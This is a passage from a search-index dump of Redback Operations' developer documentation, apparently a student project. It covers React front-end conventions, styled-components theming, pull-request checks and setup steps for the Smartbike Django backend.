Links","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/help/useful-links#core-stack-documentation","content":" ReactTypeScriptStyled ComponentsReact Router  ","version":"Next","tagName":"h2"},{"title":"Unit testing​","type":1,"pageTitle":"Useful External Links","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/help/useful-links#unit-testing","content":" React Testing Library cheatsheetJest DOM matchers  ","version":"Next","tagName":"h2"},{"title":"Auxilary tools​","type":1,"pageTitle":"Useful External Links","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/help/useful-links#auxilary-tools","content":" generate-react-cliESLinteslint-plugin-project-structure ","version":"Next","tagName":"h2"},{"title":"New Repositories","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/leaders/new-repos","content":"Last updated by: Leesa Ward, Last updated on: '12/05/2024' Last updated by: Leesa Ward, Last updated on: '12/05/2024' New Repositories info When might it be appropriate to create a new repository? You are creating a new shared library that will be used across multiple projects.A website/app is being decommissioned and replaced. If project leaders and the company web dev leader(s) agree there is a genuine need for a new web app, it should be created by forking the template repository within the Redback GitHub organisation. For a shared library, it may be more appropriate to start from scratch but copy the structure, tools, and processes of the other codebases. All new repositories should be created in the Redback Operations GitHub organisation in the first instance, not in personal accounts. This needs to be done by a project leader, company leader, mentor, or experienced student with &quot;membership&quot; of the org.","keywords":"","version":"Next"},{"title":"Shared dependencies and configuration","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/leaders/updating-from-template","content":"","keywords":"","version":"Next"},{"title":"Redback Front-End Web Template: The source of truth​","type":1,"pageTitle":"Shared dependencies and configuration","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/leaders/updating-from-template#redback-front-end-web-template-the-source-of-truth","content":" The four project repositories are forked from the Redback Front-End Web Template which is used to manage dependencies, common configuration, and shared code that doesn't belong in Redback UI.  When adding or updating packages that are shared across the projects, you should update the template and then pull the changes into your project. The intention behind this is that the changes can be reviewed in detail only once - in the template repo - and then applied to all projects without a need for a detailed review on every one.  ","version":"Next","tagName":"h2"},{"title":"Updating an app with the template's changes​","type":1,"pageTitle":"Shared dependencies and configuration","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/leaders/updating-from-template#updating-an-app-with-the-templates-changes","content":" Due to merge conflicts and branch protection rules, the &quot;sync fork&quot; button may not be available. Instead, you can manually update your project with the changes from the template repo by following these steps:  One-time initial setup: Add the template repo as the remote upstream for your project locally git remote add upstream https://github.com/Redback-Operations/redback-frontend-web-template.git Fetch the changes from the template repo git fetch upstream Create a branch for your update and check it out git checkout -b update-from-template Merge the changes from the template repo into your project git merge upstream/main Resolve any merge conflicts: There will probably be a conflict for the project name and version number in package.json, in which case you should favour your project - keep its name and update its version number in sequence with the previous one.For any other merge conflicts, carefully review the difference and decide which changes to keep and make any edits needed to combine things. Test the changes locally to ensure everything still works as expected: Run your app and do a manual check that everything runs as you expectRun the automated linting, project structure check, unit test scriptsFix any issues before proceeding Push the changes to your project's repository git push origin --set-upstream update-from-template Raise the pull request in your main project repository in the Redback org Give it a clear title such as &quot;update dependencies&quot;, &quot;update config&quot;, etc. as relevant to the changesIf there were any changes you discarded during the merge, explain why in the PR description (e.g., &quot;We're already using a newer version of this package&quot;)  ","version":"Next","tagName":"h2"},{"title":"Useful Links​","type":1,"pageTitle":"Shared dependencies and configuration","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/leaders/updating-from-template#useful-links","content":" GitHub docs: Syncing a fork ","version":"Next","tagName":"h2"},{"title":"Creating Components","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/new-components","content":"","keywords":"","version":"Next"},{"title":"Further reading​","type":1,"pageTitle":"Creating Components","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/new-components#further-reading","content":" What are components in the front-end and why do we need them? - Alex DimitrovDos and Don'ts - Tech Stack - Redback docs ","version":"Next","tagName":"h3"},{"title":"Using React Router","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/react-router","content":"Last updated by: Leesa Ward, Last updated on: '08/08/2024' Last updated by: Leesa Ward, Last updated on: '08/08/2024' Using React Router Coming soon.","keywords":"","version":"Next"},{"title":"Our projects","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/projects","content":"","keywords":"","version":"Next"},{"title":"Project structure and repositories​","type":1,"pageTitle":"Our projects","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/projects#project-structure-and-repositories","content":" Open the detailed overview Each Redback team project1 has a front-end web repository, containing a React app. It is intended that both public-facing content about that project and post-login user experiences are contained within this repository.A shared component library, Redback UI, is used across all team projects. This is a separate repository and a shared project2. Any user interface component that can be shared across projects should be added to this repository.A content management system, Redback CMS, will be used across all team projects for static information and assets, particularly those that can be shared across team projects (including mobile apps). Examples include: User guides for wearable devicesExplanations of what a graph or metric meansPublic-facing information such as &quot;About Redback&quot; or &quot;How to contact us&quot; It is intended that we will fetch this information via a REST API, but this is still in development as at May 12, 2024. More details about this project belong in its README and the Back-End section of the company documentation. A template repository, Redback Frontend Web Template, is a bare-bones React app from which the team project apps are forked. Common dependencies, configuration, and scripts should be kept in this repo and the forks kept up-to-date with it. More information can be found in the Project Maintenance section of the company documentation. If project leaders decide there is a genuine need for a new front-end app, it should be created by forking this one. Definitions​ Team project: A company-level project, such as the &quot;Wearables for athletes&quot; project or the &quot;Crowd Monitoring and Player Tracking&quot; project.Project: A more general term for the web team's work, where shared things such as Redback UI may be referred to as a &quot;project&quot;.  ","version":"Next","tagName":"h2"},{"title":"Common mistakes and how to avoid them​","type":1,"pageTitle":"Our projects","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/projects#common-mistakes-and-how-to-avoid-them","content":" Please see the Dos and Don'ts page.  ","version":"Next","tagName":"h2"},{"title":"Current Repositories​","type":1,"pageTitle":"Our projects","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/projects#current-repositories","content":" Below are links to the current repositories for all of Redback Operations' front-end web projects. You should fork the repositories you need to work with to your own GitHub account to do your work, and then raise pull requests to contribute your code to the project.  warning These are the only repositories you should be working with for front-end development. If you believe there is a genuine need for a new app/repository, please see the See the New Repositories page for more information and discuss the requirements with the company's web development leader and your project leader.  ","version":"Next","tagName":"h2"},{"title":"For all projects​","type":1,"pageTitle":"Our projects","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/projects#for-all-projects","content":"   ","version":"Next","tagName":"h3"},{"title":"Project-specific front-end repositories​","type":1,"pageTitle":"Our projects","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/projects#project-specific-front-end-repositories","content":" Please use these repositories in conjunction with Redback UI (for shared components) and Redback CMS (for content management).   ","version":"Next","tagName":"h3"},{"title":"Pages and Routes","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/new-routes","content":"","keywords":"","version":"Next"},{"title":"Creating a page​","type":1,"pageTitle":"Pages and Routes","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/new-routes#creating-a-page","content":" generate-react-cli is set up to generate the boilerplate code required for a new route using our pre-defined templates. Syntactically, they are basically the same as components, but it's important to separate them so we know what's what.  To create a new page, run the following command in your terminal, replacing PageName with the name of your new page.  npx generate-react-cli component PageName --type=route   A new folder named with your page name will be created in the src/routes directory, containing the following files:  ComponentName.tsx: the main React file for your routeComponentName.styled.ts: where styles are defined, using styled-components (see warning below)ComponentName.test.tsx: the unit test file. A basic example is included. Please add further tests as relevant to your page.  warning Generally for a route/page, there should be little to nothing in the style file because your route should be made up of components that have their own styles. If you find you're putting a lot of styles in this file, may want to consider refactoring the elements in your page into individual components.  ","version":"Next","tagName":"h2"},{"title":"Page vs route​","type":1,"pageTitle":"Pages and Routes","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/new-routes#page-vs-route","content":" As you start building your page, this is where the page vs. route distinction becomes important, particularly if you are building a page multiple levels deep in the navigation and URL structure.  Say for example you've been tasked with building a page for a Monthly Report that is accessed via My Profile &gt; Reports &gt; Monthly Report. There will probably be global page elements and section-specific page elements at each level, and you should not build or add these in your Monthly Report &quot;page&quot; file. An example structure is:  - /src - main.tsx (entry point for the app, loads &lt;Root/&gt; route and defines routes/URL paths) - /components - (individual component folders) - /routes - /Root - Root.tsx (contains components that should appear on all pages) - /MyProfile - MyProfile.tsx (contains components that should appear on all My Profile pages) - /Reports - Reports.tsx (contains components that should appear on all Reports pages) - /MonthlyReport - MonthlyReport.tsx (contains components that are specific to the Monthly Report page)   ","version":"Next","tagName":"h3"},{"title":"Adding a route for your page​","type":1,"pageTitle":"Pages and Routes","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/new-routes#adding-a-route-for-your-page","content":" At this stage, your &quot;page&quot; is basically a React component that's in a different folder to the main components. To actually see your &quot;page&quot; in the application, you need to add a route for it. This is done in the src/main.tsx file.  The routes for the Monthly Report example described above would look something like this:  // src/main.tsx { //...other router config children: [ { path: '/', element: &lt;Homepage/&gt;, }, { path: 'about', element: &lt;AboutPage/&gt;, }, { path: 'my-profile', element: &lt;MyProfile/&gt;, children: [ { path: 'reports', element: &lt;Reports/&gt;, children: [ { path: 'monthly-report', element: &lt;MonthlyReport/&gt;, }, ], }, ], }, ], }   Your Monthly Report &quot;page&quot; should now be visible at /my-profile/reports/monthly-report in your application.  For more information about routing, see the React Router page.  ","version":"Next","tagName":"h2"},{"title":"Breaking up your page into components​","type":1,"pageTitle":"Pages and Routes","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/new-routes#breaking-up-your-page-into-components","content":" As mentioned briefly above, your page should be made up of components. If you find you're putting a lot of code in your page file, you should consider breaking it up into smaller components. This will make your code easier to read, maintain, and test; and will allow use of your components on other pages so we don't duplicate functionality or design elements unnecessarily. For more information, proceed to the Creating a new component guide.  ","version":"Next","tagName":"h2"},{"title":"Further reading​","type":1,"pageTitle":"Pages and Routes","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/new-routes#further-reading","content":" Dos and Don'ts - Tech Stack - Redback docs ","version":"Next","tagName":"h2"},{"title":"Redback UI","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/redback-ui","content":"","keywords":"","version":"Next"},{"title":"Using Redback UI​","type":1,"pageTitle":"Redback UI","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/redback-ui#using-redback-ui","content":" info You can find the lastest version of Redback UI on NPM.  Installation instructions (for projects not already using it) and overall guidance on how to get started can be found in the repository README. (Note: This is the same as what is shown on the NPM page - NPM automatically uses the README file from the latest release.)  Please visit the Redback UI Storybook for documentation of the individual components.  ","version":"Next","tagName":"h2"},{"title":"Creating a new release​","type":1,"pageTitle":"Redback UI","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/redback-ui#creating-a-new-release","content":" When a new feature, bug fix, enhancement, etc. is merged into the main branch, or a collection of them are merged and ready to be released at the same time, a new release must be created and published for the changes to be available to other projects.  warning This process must be performed by someone with write access to the GitHub repository.  Increment versionBegin in GitHubTag and titleAdd release notesPublish releaseMonitor release actionCheck NPM Step 1. Increment version Create a branch and update the version number in the package.json file. Raise a PR to merge the changes into the main branch, and when it is approved and merged, you can proceed to the next step. Next step→ ","version":"Next","tagName":"h2"},{"title":"Automated tests","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/tests","content":"","keywords":"","version":"Next"},{"title":"Useful links​","type":1,"pageTitle":"Automated tests","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/tests#useful-links","content":" React Testing Library cheatsheetJest DOM matchers ","version":"Next","tagName":"h2"},{"title":"Submitting code","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/submitting-work","content":"","keywords":"","version":"Next"},{"title":"Small pull requests, often​","type":1,"pageTitle":"Submitting code","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/submitting-work#small-pull-requests-often","content":" Please favour raising small pull requests often over one or two large ones. This makes it easier for reviewers to understand the changes, and for you to make changes based on feedback. It also makes it easier to keep your branch up to date with the main branch as others' work gets merged in.  For example, instead of building an entire webpage and raising your first PR in week 10, raise a PR for the first component you build in week 3 or 4, then another for another component in week 5 or 6, etc.  ","version":"Next","tagName":"h2"},{"title":"One feature or change per pull request​","type":1,"pageTitle":"Submitting code","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/submitting-work#one-feature-or-change-per-pull-request","content":" Please limit each pull request to one discrete unit of work, e.g., one new component for Redback UI, one new graph for a dashboard, one bugfix, etc. This makes it easier for reviewers to understand the changes and for feedback and discussion to be focused on a single topic.  This usually means you will have a separate branch per feature or change, so you can continue working on another unit of work while the first is being reviewed.  ","version":"Next","tagName":"h2"},{"title":"Ensuring your pull request is ready for review​","type":1,"pageTitle":"Submitting code","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/submitting-work#ensuring-your-pull-request-is-ready-for-review","content":" Before raising a pull request, please ensure the below checks pass.  Run eslint to check for any formatting and linting issues, and fix any that are identified in your code npm run lint Often, linting errors (such as spacing issues) can be fixed automatically by your IDE. It is highly recommended to configure it to run eslint --fix when you save a file, and save yourself a lot of time and tedious effort fixing little things you mightn't even notice. You can do this in WebStorm and VS Code and probably others. Check that project structure, file naming, and file type conventions have been followed (note: this also uses eslint, so will also pick up any other formatting and linting issues that step 1 would - I've just made it a separate step for clarity) npm run lint:structure Important! If you got any errors from the project structure check, fix them before proceeding. If your feature/change cannot work with the current configuration in project-structure.json, include the necessary config change in your pull request so it can be assessed by reviewers, and to ensure that non-compliant code does not get merged. Documentation for the linter can be found at eslint-plugin-project-structure. For most work, the main directory structure and naming conventions to be aware of follow the below pattern: - src/ - routes/ (all apps EXCEPT Redback UI) - RouteName/ - RouteName.tsx - RouteName.style.ts - RouteName.test.tsx - components/ - ComponentName/ - ComponentName.tsx - ComponentName.style.ts - ComponentName.test.tsx - ComponentName.stories.tsx (Redback UI only) Note that the file names match the folder names, and all are in PascalCase (this is the general React convention). If you use the generator script to create new pages/routes and components, they will follow this automatically. Run unit tests, and if any of the tests related to the components you've worked on or used fail, fix the problem npm run test:unit When all checks are passing and your work is ready for peer feedback, create a pull request on GitHub.  ","version":"Next","tagName":"h2"},{"title":"Useful links​","type":1,"pageTitle":"Submitting code","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/submitting-work#useful-links","content":" Packaging pull requestsProject structure linter docsESLint in WebStorm - How to configure ESLint in WebStorm and fix formatting on saveESLint VS Code extension - can be figured to fix formatting on save ","version":"Next","tagName":"h2"},{"title":"General upskilling resources","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/upskilling","content":"","keywords":"","version":"Next"},{"title":"React for beginners​","type":1,"pageTitle":"General upskilling resources","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/upskilling#react-for-beginners","content":" [Video series] The Beginners' Guide to React - Kent C. Dodds on Egghead, last updated 2021[Written tutorial] Common beginner mistakes in React - Josh W Comeau[Video series] React: Using TypeScript - Emmanuel Henri on LinkedIn Learning, April 2024[Video series] React Hooks - Eve Porcello on LinkedIn Learning, December 2020[Video series] Coding Exercises: React.js - Ali Spittel on LinkedIn Learning, June 2022  ","version":"Next","tagName":"h2"},{"title":"Styled Components​","type":1,"pageTitle":"General upskilling resources","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/upskilling#styled-components","content":" [Written tutorial] De-mystifying styled components - Josh W Comeau[Video series] React with Styled Components - Julia Dyck on LinkedIn Learning, April 2024  ","version":"Next","tagName":"h2"},{"title":"Accessibility​","type":1,"pageTitle":"General upskilling resources","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/upskilling#accessibility","content":" Develop Accessible Web Apps with React - Erin Doyle on Egghead, last updated 2023  ","version":"Next","tagName":"h2"},{"title":"TypeScript​","type":1,"pageTitle":"General upskilling resources","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/upskilling#typescript","content":" [Video series] Up and running with TypeScript - John Lindquist on Egghead, last updated 2023[Video series] TypeScript Essential Training - Jess Chadwick on LinkedIn Learning, April 2024[Video series] React: Using TypeScript - Emmanuel Henri on LinkedIn Learning, April 2024  ","version":"Next","tagName":"h2"},{"title":"Intermediate topics in React​","type":1,"pageTitle":"General upskilling resources","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/upskilling#intermediate-topics-in-react","content":" [Written tutorial] Understanding useMemo and useCallback - Josh W Comeau[Written tutorial] Data binding in React - Josh W Comeau[Written tutorial] Why React Re-Renders - Josh W Comeau[Video series] Building Modern UIs with React Router V6 - Guil Hernandez on LinkedIn Learning, August 2022[Video series] React: Working with APIs - Emmanuel Henri on LinkedIn Learning, July 2023  ","version":"Next","tagName":"h2"},{"title":"Testing​","type":1,"pageTitle":"General upskilling resources","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/upskilling#testing","content":" [Video series] An introduction to the React Testing Library - Daniel Afonso on Egghead, last updated January 2024  tip When finding further resources yourself, always ensure they are up-to-date and relevant to the version of the technology we are using. For example, if you are learning React, the current version is 18 and function components are generally preferred over class components. Older resources may go into detail about class components and lifecycle methods which are no longer considered best practice. ","version":"Next","tagName":"h2"},{"title":"Mobile projects","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/mobile-projects","content":"","keywords":"","version":"Next"},{"title":"Project structure and repositories​","type":1,"pageTitle":"Mobile projects","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/mobile-projects#project-structure-and-repositories","content":" ","version":"Next","tagName":"h2"},{"title":"For all projects​","type":1,"pageTitle":"Mobile projects","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/mobile-projects#for-all-projects","content":"   ","version":"Next","tagName":"h3"},{"title":"Project-specific mobile app repositories​","type":1,"pageTitle":"Mobile projects","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/mobile-projects#project-specific-mobile-app-repositories","content":"  ","version":"Next","tagName":"h3"},{"title":"Using Styled Components","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/styled-components","content":"","keywords":"","version":"Next"},{"title":"What is Styled Components?​","type":1,"pageTitle":"Using Styled Components","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/styled-components#what-is-styled-components","content":" Styled Components is a CSS-in-JS library that allows you to write CSS directly in your JavaScript files, co-located with the React component code that outputs the HTML and handles interactivity.  ","version":"Next","tagName":"h2"},{"title":"Why use Styled Components?​","type":1,"pageTitle":"Using Styled Components","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/styled-components#why-use-styled-components","content":" When using Styled Components, styling is scoped to the components you create with it. This means that you can write CSS that is specific to a component, and not have to worry about it affecting other components. You can also use variables to dynamically set styles.  You might be thinking, but I can do that with CSS modules, or a basic global stylesheet! They're scoped to the component, and I can use CSS variables to set my theme colours! That's true, but a key advantage of Styled Components over plain CSS or CSS modules is in the realm of theming.  ","version":"Next","tagName":"h2"},{"title":"What is a theme?​","type":1,"pageTitle":"Using Styled Components","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/styled-components#what-is-a-theme","content":" With Styled Components, you can create a theme object that you can pass down to all your components. This allows us to create highly reusable components that will take on the styling of the website/app they're being used on without any changes to the component itself. For example, your theme might define the &quot;primary&quot; colour as blue, and all components that use the &quot;primary&quot; colour will be blue. If you decide to change the primary colour to red, you only need to change it in one place; and if another app using your component has a &quot;primary&quot; colour of yellow, the same component will appear yellow throughout that app. Likewise for typefaces, font sizes, spacing, and more.  ","version":"Next","tagName":"h3"},{"title":"Why use CSS-in-JS for theming?​","type":1,"pageTitle":"Using Styled Components","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/styled-components#why-use-css-in-js-for-theming","content":" Yes, you can do most of the above by setting CSS variables in a global stylesheet, or using a pre-processor like SASS. Styled Components has been selected for our projects because it's a little simpler than using SCSS in our environment, and it's more powerful than CSS variables.  Some examples of the power of CSS-in-JS are in the ability to perform calculations using variables, such as:  Setting a button's hover colour to 10% darker than its usual colour (without needing to know the colour in advance or calculate what hex code or RGB value 10% darker would be)Choosing whether to show black or white text on an element based on its background colour, without needing to know the background colour in advance or manually check the contrast ratio (the supplementary library &quot;Polished&quot; has utilities for this)Make other dynamic adjustments for accessibility, such as darkening a pale colour a few shades when it's on a white background (without needing to know any of this in advance - we can simply add calculations when creating the component that checks the passed-in colours from the theme and adjusts them if needed).  ","version":"Next","tagName":"h3"},{"title":"How to use Styled Components​","type":1,"pageTitle":"Using Styled Components","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/styled-components#how-to-use-styled-components","content":" ","version":"Next","tagName":"h2"},{"title":"For a new component​","type":1,"pageTitle":"Using Styled Components","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/styled-components#for-a-new-component","content":" Please follow the Creating a new component guide when creating a new component in a Redback project. The guide will help you set up the component with the correct file structure and naming conventions. The below steps assume you have done this.  In the YourComponent.tsx file, you should have a &quot;starter&quot; styled component, called StyledYourComponent. That component is defined as a Styled Component in YourComponent.style.ts. 2. The first step is to consider what HTML element your component should ultimately render as. The generator will have set this to a div by default, but you should change it to the most semantically appropriate element. For example, if your component is a list, you should change it to the type of list it should be (e.g. ul or ol). You can also adjust the name as appropriate. BeforeAfter const StyledList = styled.ul` /* Your styles here */ `; The backticks `` after styled define a tagged template literal, which is a string that allows you to interpolate variables and expressions. This is how you can write CSS directly in your JavaScript file, just as you would in a plain CSS file, a CSS module, or a SCSS file. This format supports SCSS-like syntax and nesting, including nesting media queries. There's just one important difference - the theming and use of variables discussed above. Here's the basic syntax for using a theme variable, using spacing as an example: const StyledList = styled.ul` padding: ${props =&gt; props.theme.spacing.sm}; `; (You don't need to explicitly pass the props/theme here - as long as your component is wrapped in a ThemeProvider, which we do using RedbackUiThemeProvider, the theme will be available to all styled components in the app using this syntax). You can find the expected theme structure in the Redback UI codebase and refer to the documentation for some of the provided theme variables such as colours and fonts. You can also pass props from your main React component to your styled component, and use them to conditionally apply styles. For example, an Alert component could have a type prop that determines whether it's a success, warning, or error alert, and the styled component could change the styling based on this prop. info Because we're using TypeScript, you just also need to tell it the props that can be passed in and their expected value type (in the below example it's a specific set of valid strings, but it can also be a primitive type such as number). tip This example also uses the readableColor function from the Polished library to automatically set the text colour to black or white based on the background colour. This is a great example of the power of CSS-in-JS. Alert.tsxAlert.style.ts import styled from 'styled-components'; import { readableColor } from 'polished'; export const StyledAlert = styled.div&lt;{type: 'success' | 'info' | 'warning' | 'error'}&gt;` background: ${props =&gt; props.theme.colors[props.type]}; color: ${props =&gt; readableColor(props.theme.colors[props.type])}; `; In this example, type is a prop passed to the styled component which is expected to match a colour name in the theme. For example, for &lt;Alert type=&quot;success&quot;/&gt;, this would translate to props.theme.colours.success, so it will look up colours in the theme object and find the value of success and use that colour. You can add more styled components to this file as needed, just as you would for adding CSS classes for parts of your overall React component. For example, if you are creating a list, you don't need to create entirely separate components for the list and the list items. You can create a styled component for the list, and a styled component for the list items.  ","version":"Next","tagName":"h3"},{"title":"Converting from CSS modules or plain CSS​","type":1,"pageTitle":"Using Styled Components","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/styled-components#converting-from-css-modules-or-plain-css","content":" Generate new component files using the Creating a new component guide. For each HTML element you have styled in your CSS module or plain CSS file, create a styled component in the YourComponent.style.ts file. Here's an example of converting the syntax: BeforeAfter export const StyledContainer = styled.div` display: flex; justify-content: center; align-items: center; `; Follow the &quot;For a new component&quot; guide above for more information on how to use theme variables and props in your styled components. Copy your HTML into the new YourComponent.tsx file, and replace the HTML tags with their corresponding styled components. For example, if you have a div with a class of container, you would replace it with StyledContainer in the YourComponent.tsx file. Here's an example of how this might look: BeforeAfter import { FC, PropsWithChildren } from 'react'; import { StyledContainer } from './YourComponent.style'; export const YourComponent: FC&lt;PropsWithChildren&gt; = ({ children }) =&gt; { return ( &lt;StyledContainer&gt; {children} &lt;/StyledContainer&gt; ); };   ","version":"Next","tagName":"h3"},{"title":"Useful Links​","type":1,"pageTitle":"Using Styled Components","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/styled-components#useful-links","content":" Styled Components documentationPolished documentationRedback UI themes ","version":"Next","tagName":"h2"},{"title":"Smartbike backend readme","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-mobile-backend","content":"","keywords":"","version":"Next"},{"title":"Prerequisites​","type":1,"pageTitle":"Smartbike backend readme","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-mobile-backend#prerequisites","content":" GitPython 3Virtual Environment (venv)Visual Studio Code or any preferred IDEDjango and other Python libraries  ","version":"Next","tagName":"h2"},{"title":"Installation Steps​","type":1,"pageTitle":"Smartbike backend readme","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-mobile-backend#installation-steps","content":" ","version":"Next","tagName":"h2"},{"title":"1. Fork the Repository​","type":1,"pageTitle":"Smartbike backend readme","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-mobile-backend#1-fork-the-repository","content":" First, fork the repository to your own GitHub account:  Visit the repository at Redback SmartBike Mobile GitHub.Click on the Fork button at the top right corner of the page. This will create a copy of the repository in your GitHub account.  ","version":"Next","tagName":"h3"},{"title":"2. Clone the Forked Repository​","type":1,"pageTitle":"Smartbike backend readme","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-mobile-backend#2-clone-the-forked-repository","content":" After forking, clone the repository to your local machine by opening a terminal and running the following commands:  git clone https://github.com/&lt;Your_GitHub_Username&gt;/redback-smartbike-mobile.git cd redback-smartbike-mobile   Replace &lt;Your_GitHub_Username&gt; with your actual GitHub username.  This will download the repository files to your local system and change your directory to the repository's root.  ","version":"Next","tagName":"h3"},{"title":"3. Open the Project in Visual Studio Code​","type":1,"pageTitle":"Smartbike backend readme","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-mobile-backend#3-open-the-project-in-visual-studio-code","content":" You can open the project directory in VS Code by typing:  code .   Alternatively, use the source control option in VS Code to clone and open the repository directly.  ","version":"Next","tagName":"h3"},{"title":"4. Set Up Python Virtual Environment​","type":1,"pageTitle":"Smartbike backend readme","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-mobile-backend#4-set-up-python-virtual-environment","content":" Navigate to the backend_server directory:  cd backend_server   Create and activate the virtual environment:  For Windows  python -m venv .venv .venv\\Scripts\\activate   For MacOS/Linux  python3 -m venv .venv source .venv/bin/activate   ","version":"Next","tagName":"h3"},{"title":"5. Install Dependencies​","type":1,"pageTitle":"Smartbike backend readme","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-mobile-backend#5-install-dependencies","content":" Install Django and other necessary Python libraries:  pip install django djangorestframework pip install python-dotenv pip install numpy matplotlib scikit-learn pip install redis celery Django-celery-results pip install Pillow   ","version":"Next","tagName":"h3"},{"title":"6. Configure Environment Variables​","type":1,"pageTitle":"Smartbike backend readme","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-mobile-backend#6-configure-environment-variables","content":" Create a .env file at the project root and specify the following values:  SECURITY WARNING: keep the secret key used in production secret!​  SECRET_KEY = &quot;your_secret_key_here&quot;   Email functionality  EMAIL_BACKEND = &quot;django.core.mail.backends.console.EmailBackend&quot; DEFAULT_FROM_EMAIL = &quot;your_email@example.com&quot;   ","version":"Next","tagName":"h3"},{"title":"7. Database Setup​","type":1,"pageTitle":"Smartbike backend readme","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-mobile-backend#7-database-setup","content":" From the backend_server directory, run the following commands to set up the database:  python manage.py makemigrations python manage.py migrate   ","version":"Next","tagName":"h3"},{"title":"8. Run the Server​","type":1,"pageTitle":"Smartbike backend readme","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-mobile-backend#8-run-the-server","content":" Start the backend server:  python manage.py runserver 0.0.0.0:8000   ","version":"Next","tagName":"h3"},{"title":"Troubleshooting Common Errors​","type":1,"pageTitle":"Smartbike backend readme","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-mobile-backend#troubleshooting-common-errors","content":" ","version":"Next","tagName":"h2"},{"title":"Error 1: Pillow Installation Issue​","type":1,"pageTitle":"Smartbike backend readme","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-mobile-backend#error-1-pillow-installation-issue","content":" Description: You may encounter an error related to the ImageField if Pillow is not installed.  backend_server.acc_details.image: (fields.E210) Cannot use ImageField because Pillow is not installed. HINT: Get Pillow at https://pypi.org/project/Pillow/ or run command &quot;python -m pip install Pillow&quot;.  Solution:​  Check your Python version and install Pillow:  python -m pip install Pillow   or​  python3 -m pip install Pillow   ","version":"Next","tagName":"h3"},{"title":"Error 2: Dotenv Module Not Found​","type":1,"pageTitle":"Smartbike backend readme","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-mobile-backend#error-2-dotenv-module-not-found","content":" Description: If the system cannot find the dotenv module, you might see a ModuleNotFoundError.  ModuleNotFoundError: No module named 'dotenv'  Solution:​  Check if python-dotenv is already installed:  pip list   If found, uninstall and reinstall python-dotenv:  pip uninstall python-dotenv pip install python-dotenv   If not found, simply install the module:  pip install python-dotenv   Restart Visual Studio Code or your IDE to ensure the environment is refreshed. ","version":"Next","tagName":"h3"},{"title":"Smartbike mobile app readme","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-readme","content":"","keywords":"","version":"Next"},{"title":"Redback SmartBike Mobile App Frontend Setup​","type":1,"pageTitle":"Smartbike mobile app readme","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-readme#redback-smartbike-mobile-app-frontend-setup","content":" 